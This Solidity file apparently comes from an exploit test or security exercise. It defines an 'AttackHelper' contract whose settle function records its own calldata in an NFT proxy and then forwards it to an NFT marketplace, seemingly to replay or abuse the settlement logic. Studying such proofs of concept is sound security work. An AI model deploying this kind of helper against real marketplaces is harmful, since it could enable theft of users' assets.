// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ListingData, BidData, Signature} from "../src/NftMarketplace.sol";

interface NFTproxy {
    function setSettleCalldata(bytes memory _settleCalldata) external;
}

contract AttackHelper {
    address private immutable nftMarketplace;
    address private immutable nftProxy;

    constructor(address _nftMarketplace, address _nftProxy) {
        nftProxy = _nftProxy;
        nftMarketplace = _nftMarketplace;
    }

    function settle(
        address owner,
        address buyer,
        ListingData calldata listingData,
        BidData calldata bidData,
        Signature calldata listingSig,
        Signature calldata bidSig,
        Signature calldata settlementSig
    ) external {
        NFTproxy(nftProxy).setSettleCalldata(msg.data);
        (bool isSuccessful,) = nftMarketplace.call(msg.data);
        require(isSuccessful);
    }
}
